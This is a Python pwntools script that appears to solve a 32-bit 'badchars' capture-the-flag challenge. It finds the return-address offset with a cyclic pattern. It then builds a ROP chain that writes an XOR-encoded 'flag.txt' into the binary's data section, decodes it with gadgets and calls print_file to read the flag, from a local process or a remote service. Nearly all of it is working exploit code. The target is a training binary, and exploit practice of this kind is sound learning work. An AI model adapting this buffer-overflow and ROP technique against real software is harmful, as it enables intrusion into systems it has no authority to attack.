#!/usr/bin/env python3

from pwn import *

exe = ELF("badchars32_patched")
libc = ELF("libbadchars32.so")

context.binary = exe
rop = ROP(exe)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    payload = cyclic(100, alphabet = 'bcdefhijklmnopqrstuvwyz')
    r.sendlineafter(b'>', payload)
    r.wait()
    core = r.corefile
    eip = core.eip
    offset = cyclic_find(eip, alphabet = 'bcdefhijklmnopqrstuvwyz')

    r = conn()

    popesiediebp = rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"])[0]
    popebp = rop.ebp.address
    popebx = rop.ebx.address
    xorebpebx = exe.symbols.usefulGadgets + 0x4
    ret = rop.ret.address
    xorstr = xor('flag.txt', 2)

    xorsploit = b''
    datasecoff = 0
    for c in xorstr:
        xorsploit += pack(popebp)
        xorsploit += pack(exe.symbols.data_start + datasecoff)
        xorsploit += pack(popebx)
        xorsploit += pack(0x2)
        xorsploit += pack(xorebpebx)
        datasecoff += 1

    payload = flat(b'A'*offset, popesiediebp, xorstr[:4], exe.symbols.data_start, 0x0, exe.symbols.usefulGadgets + 12, popesiediebp, xorstr[4:], exe.symbols.data_start + 0x4, 0x0, exe.symbols.usefulGadgets + 12, xorsploit, exe.symbols.print_file, 0x0, exe.symbols.data_start)

    r.sendlineafter(b'>', payload)
    
    r.recvuntil('you!\n')
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
